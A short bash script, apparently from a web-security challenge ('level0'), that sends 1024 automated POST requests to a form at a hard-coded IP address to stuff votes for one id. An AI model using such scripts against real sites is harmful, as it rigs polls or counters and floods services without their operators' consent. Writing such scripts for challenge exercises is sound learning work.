#!/bin/bash 
COUNTER=0
while [  $COUNTER -lt 1024 ]; do
	curl --data "id=33&holdthedoor=submit" http://173.246.108.142/level0.php
	let COUNTER=COUNTER+1 
done